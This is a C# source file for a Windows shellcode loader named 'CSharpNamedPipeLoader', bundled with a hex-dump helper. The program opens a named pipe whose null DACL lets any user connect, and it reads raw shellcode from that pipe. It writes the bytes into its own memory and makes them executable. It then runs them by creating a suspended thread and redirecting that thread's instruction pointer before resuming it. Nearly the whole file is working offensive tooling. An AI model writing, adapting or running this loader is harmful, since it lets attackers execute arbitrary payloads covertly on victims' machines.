using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace HexDump
{
	class Utils
	{
		public static string HexDump(byte[] bytes, int bytesPerLine = 16)
		{
			if (bytes == null) return "<null>";
			int bytesLength = bytes.Length;

			char[] HexChars = "0123456789ABCDEF".ToCharArray();

			int firstHexColumn =
				  8                   // 8 characters for the address
				+ 3;                  // 3 spaces

			int firstCharColumn = firstHexColumn
				+ bytesPerLine * 3       // - 2 digit for the hexadecimal value and 1 space
				+ (bytesPerLine - 1) / 8 // - 1 extra space every 8 characters from the 9th
				+ 2;                  // 2 spaces 

			int lineLength = firstCharColumn
				+ bytesPerLine           // - characters to show the ascii value
				+ Environment.NewLine.Length; // Carriage return and line feed (should normally be 2)

			char[] line = (new String(' ', lineLength - 2) + Environment.NewLine).ToCharArray();
			int expectedLines = (bytesLength + bytesPerLine - 1) / bytesPerLine;
			StringBuilder result = new StringBuilder(expectedLines * lineLength);

			for (int i = 0; i < bytesLength; i += bytesPerLine)
			{
				line[0] = HexChars[(i >> 28) & 0xF];
				line[1] = HexChars[(i >> 24) & 0xF];
				line[2] = HexChars[(i >> 20) & 0xF];
				line[3] = HexChars[(i >> 16) & 0xF];
				line[4] = HexChars[(i >> 12) & 0xF];
				line[5] = HexChars[(i >> 8) & 0xF];
				line[6] = HexChars[(i >> 4) & 0xF];
				line[7] = HexChars[(i >> 0) & 0xF];

				int hexColumn = firstHexColumn;
				int charColumn = firstCharColumn;

				for (int j = 0; j < bytesPerLine; j++)
				{
					if (j > 0 && (j & 7) == 0) hexColumn++;
					if (i + j >= bytesLength)
					{
						line[hexColumn] = ' ';
						line[hexColumn + 1] = ' ';
						line[charColumn] = ' ';
					}
					else
					{
						byte b = bytes[i + j];
						line[hexColumn] = HexChars[(b >> 4) & 0xF];
						line[hexColumn + 1] = HexChars[b & 0xF];
						line[charColumn] = asciiSymbol(b);
					}
					hexColumn += 3;
					charColumn++;
				}
				result.Append(line);
			}
			return result.ToString();
		}
		static char asciiSymbol(byte val)
		{
			if (val < 32) return '.';  // Non-printable ASCII
			if (val < 127) return (char)val;   // Normal ASCII
											   // Handle the hole in Latin-1
			if (val == 127) return '.';
			if (val < 0x90) return "€.‚ƒ„…†‡ˆ‰Š‹Œ.Ž."[val & 0xF];
			if (val < 0xA0) return ".‘’“”•–—˜™š›œ.žŸ"[val & 0xF];
			if (val == 0xAD) return '.';   // Soft hyphen: this symbol is zero-width even in monospace fonts
			return (char)val;   // Normal Latin-1
		}
	}
}


namespace CSharpNamedPipeLoader
{
    public class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode,
       uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize,
       uint nDefaultTimeOut, SECURITY_ATTRIBUTES lpSecurityAttributes);

        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe,
        IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer,
        uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

		[DllImport("kernel32.dll")]
		static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

		[DllImport("kernel32.dll")]
		static extern uint SuspendThread(IntPtr hThread);

		[DllImport("kernel32.dll", SetLastError = true)]
		static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

		[DllImport("kernel32.dll", SetLastError = true)]
		static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

		[DllImport("kernel32.dll")]
		static extern int ResumeThread(IntPtr hThread);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		static extern bool CloseHandle(IntPtr handle);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

		[DllImport("kernel32.dll", SetLastError = true)]
		static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

		[DllImport("kernel32.dll")]
		static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);


		// Process privileges
		const int PROCESS_CREATE_THREAD = 0x0002;
		const int PROCESS_QUERY_INFORMATION = 0x0400;
		const int PROCESS_VM_OPERATION = 0x0008;
		const int PROCESS_VM_WRITE = 0x0020;
		const int PROCESS_VM_READ = 0x0010;

		// Memory permissions
		const uint MEM_COMMIT = 0x00001000;
		const uint MEM_RESERVE = 0x00002000;
		const uint PAGE_READWRITE = 4;
		const uint PAGE_EXECUTE_READWRITE = 0x40;

		[Flags]
		public enum ThreadAccess : int
		{
			TERMINATE = (0x0001),
			SUSPEND_RESUME = (0x0002),
			GET_CONTEXT = (0x0008),
			SET_CONTEXT = (0x0010),
			SET_INFORMATION = (0x0020),
			QUERY_INFORMATION = (0x0040),
			SET_THREAD_TOKEN = (0x0080),
			IMPERSONATE = (0x0100),
			DIRECT_IMPERSONATION = (0x0200),
			THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
			THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
		}

		public enum CONTEXT_FLAGS : uint
		{
			CONTEXT_i386 = 0x10000,
			CONTEXT_i486 = 0x10000,   //  same as i386
			CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
			CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
			CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
			CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
			CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
			CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
			CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
			CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
		}

		// x86 float save
		[StructLayout(LayoutKind.Sequential)]
		public struct FLOATING_SAVE_AREA
		{
			public uint ControlWord;
			public uint StatusWord;
			public uint TagWord;
			public uint ErrorOffset;
			public uint ErrorSelector;
			public uint DataOffset;
			public uint DataSelector;
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
			public byte[] RegisterArea;
			public uint Cr0NpxState;
		}

		// x86 context structure (not used in this example)
		[StructLayout(LayoutKind.Sequential)]
		public struct CONTEXT
		{
			public uint ContextFlags; //set this to an appropriate value 
									  // Retrieved by CONTEXT_DEBUG_REGISTERS 
			public uint Dr0;
			public uint Dr1;
			public uint Dr2;
			public uint Dr3;
			public uint Dr6;
			public uint Dr7;
			// Retrieved by CONTEXT_FLOATING_POINT 
			public FLOATING_SAVE_AREA FloatSave;
			// Retrieved by CONTEXT_SEGMENTS 
			public uint SegGs;
			public uint SegFs;
			public uint SegEs;
			public uint SegDs;
			// Retrieved by CONTEXT_INTEGER 
			public uint Edi;
			public uint Esi;
			public uint Ebx;
			public uint Edx;
			public uint Ecx;
			public uint Eax;
			// Retrieved by CONTEXT_CONTROL 
			public uint Ebp;
			public uint Eip;
			public uint SegCs;
			public uint EFlags;
			public uint Esp;
			public uint SegSs;
			// Retrieved by CONTEXT_EXTENDED_REGISTERS 
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
			public byte[] ExtendedRegisters;
		}

		// x64 m128a
		[StructLayout(LayoutKind.Sequential)]
		public struct M128A
		{
			public ulong High;
			public long Low;

			public override string ToString()
			{
				return string.Format("High:{0}, Low:{1}", this.High, this.Low);
			}
		}

		// x64 save format
		[StructLayout(LayoutKind.Sequential, Pack = 16)]
		public struct XSAVE_FORMAT64
		{
			public ushort ControlWord;
			public ushort StatusWord;
			public byte TagWord;
			public byte Reserved1;
			public ushort ErrorOpcode;
			public uint ErrorOffset;
			public ushort ErrorSelector;
			public ushort Reserved2;
			public uint DataOffset;
			public ushort DataSelector;
			public ushort Reserved3;
			public uint MxCsr;
			public uint MxCsr_Mask;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
			public M128A[] FloatRegisters;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
			public M128A[] XmmRegisters;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
			public byte[] Reserved4;
		}

		// x64 context structure
		[StructLayout(LayoutKind.Sequential, Pack = 16)]
		public struct CONTEXT64
		{
			public ulong P1Home;
			public ulong P2Home;
			public ulong P3Home;
			public ulong P4Home;
			public ulong P5Home;
			public ulong P6Home;

			public CONTEXT_FLAGS ContextFlags;
			public uint MxCsr;

			public ushort SegCs;
			public ushort SegDs;
			public ushort SegEs;
			public ushort SegFs;
			public ushort SegGs;
			public ushort SegSs;
			public uint EFlags;

			public ulong Dr0;
			public ulong Dr1;
			public ulong Dr2;
			public ulong Dr3;
			public ulong Dr6;
			public ulong Dr7;

			public ulong Rax;
			public ulong Rcx;
			public ulong Rdx;
			public ulong Rbx;
			public ulong Rsp;
			public ulong Rbp;
			public ulong Rsi;
			public ulong Rdi;
			public ulong R8;
			public ulong R9;
			public ulong R10;
			public ulong R11;
			public ulong R12;
			public ulong R13;
			public ulong R14;
			public ulong R15;
			public ulong Rip;

			public XSAVE_FORMAT64 DUMMYUNIONNAME;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
			public M128A[] VectorRegister;
			public ulong VectorControl;

			public ulong DebugControl;
			public ulong LastBranchToRip;
			public ulong LastBranchFromRip;
			public ulong LastExceptionToRip;
			public ulong LastExceptionFromRip;
		}

		[DllImport("kernel32.dll")]
		static extern IntPtr GetCurrentProcess();

		[DllImport("kernel32.dll")]
		static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
   int dwSize, uint flNewProtect, out uint lpflOldProtect);

		[DllImport("kernel32.dll")]
		private static extern IntPtr CreateThread(
		uint lpThreadAttributes,
		uint dwStackSize,
		IntPtr lpStartAddress,
		IntPtr param,
		uint dwCreationFlags,
		ref uint lpThreadId);
	
	
		
		[DllImport("kernel32.dll")]
		private static extern uint WaitForSingleObject(
			IntPtr hHandle,
			uint dwMilliseconds);

		[DllImport("kernel32.dll")]
		private static extern uint WaitNamedPipeA(
			string lpName,
			uint dwMilliseconds);

		[StructLayoutAttribute(LayoutKind.Sequential)]
		public struct SECURITY_DESCRIPTOR
		{
			public byte revision;
			public byte size;
			public short control;
			public IntPtr owner;
			public IntPtr group;
			public IntPtr sacl;
			public IntPtr dacl;
		}

		[StructLayout(LayoutKind.Sequential)]
		public struct SECURITY_ATTRIBUTES
		{
			public int nLength;
			public IntPtr lpSecurityDescriptor;
			public bool bInheritHandle;
		}

		[DllImport("advapi32.dll", SetLastError = true)]
		static extern bool InitializeSecurityDescriptor(out SECURITY_DESCRIPTOR SecurityDescriptor, uint dwRevision);


		[DllImport("advapi32.dll", SetLastError = true)]
		static extern bool SetSecurityDescriptorDacl(ref SECURITY_DESCRIPTOR sd, bool daclPresent, IntPtr dacl, bool daclDefaulted);

		[DllImport("kernel32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer,
		uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten,
		[In]  uint lpOverlapped);

		public Program()
        {
			Main(new string[] { });
		}
		static void Main(string[] args)
        {
			SECURITY_DESCRIPTOR sd;
			InitializeSecurityDescriptor( out sd, 1);
			SetSecurityDescriptorDacl(ref sd, true, IntPtr.Zero, false);

			SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
			sa.nLength = Marshal.SizeOf(sa);
			sa.lpSecurityDescriptor = Marshal.AllocHGlobal(Marshal.SizeOf(sd));
			sa.bInheritHandle = true;
			Marshal.StructureToPtr(sd, sa.lpSecurityDescriptor, false);

			IntPtr hPipe = CreateNamedPipe("\\\\.\\pipe\\6e7645c4-32c5-4fe3-aabf-e94c2f4370e7",
				0x00000003 | 0x40000000, 
				0x00000006, 
				255, 
				0x100000, 
				0x100000, 
				2000, 
				sa);

            if (hPipe == IntPtr.Zero)
            {
                Console.WriteLine("[-] Named pipe creation failed");
            }


			bool connected = ConnectNamedPipe(hPipe, IntPtr.Zero);
            if (connected)
            {
                byte[] shellcode = new byte[0];
                while(true)
                {
					uint numberOfBytesRead;
                    byte[] readBuffer = new byte[0x100000];
                    bool readSuccess = ReadFile(hPipe,  readBuffer, 0x100000, out numberOfBytesRead, IntPtr.Zero);
                    shellcode = shellcode.Concat(readBuffer.Take((int)numberOfBytesRead)).ToArray();
					Console.WriteLine("[+] Read chunk of bytes: " + numberOfBytesRead.ToString());
					Console.WriteLine(HexDump.Utils.HexDump(readBuffer.Take((int)numberOfBytesRead).ToArray(), 10));

					break;
					// this was the proper way of waiting for all the data to be transmitted, but yolo
					/* if (readSuccess == false || numberOfBytesRead == 0)
                        break;*/
                }

                Console.WriteLine("[+] Size: " + shellcode.Length.ToString());

				uint written = 0;
				WriteFile(hPipe, shellcode, (uint)shellcode.Length, out written, (uint)0);

				IntPtr allocMemAddress = VirtualAllocEx(GetCurrentProcess(), IntPtr.Zero, (uint)(shellcode.Length), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

				// Write shellcode within process
				UIntPtr bytesWritten;
				bool resp1 = WriteProcessMemory(GetCurrentProcess(), allocMemAddress, shellcode, (uint)(shellcode.Length), out bytesWritten);

				uint oldProt;
				VirtualProtectEx(GetCurrentProcess(), allocMemAddress, shellcode.Length, 0x20, out oldProt);

				IntPtr hThread = IntPtr.Zero;
				uint threadId = 0;
				IntPtr pinfo = IntPtr.Zero;

				Console.WriteLine("[+] Creating suspended thread");
				hThread = CreateThread(0, 0, allocMemAddress, pinfo, 0x00000004, ref threadId);
				System.Threading.Thread.Sleep(200); 

				// Get thread context
				CONTEXT64 tContext = new CONTEXT64();
				tContext.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;
				GetThreadContext(hThread, ref tContext);
				tContext.Rip = (ulong)allocMemAddress.ToInt64();

				Console.WriteLine("[+] Getting the thread's context");
				SetThreadContext(hThread, ref tContext);

				Console.WriteLine("[+] Resuming thread");
				ResumeThread(hThread);

				WaitForSingleObject(hThread, 0xFFFFFFFF);
			}
		}
    }
}
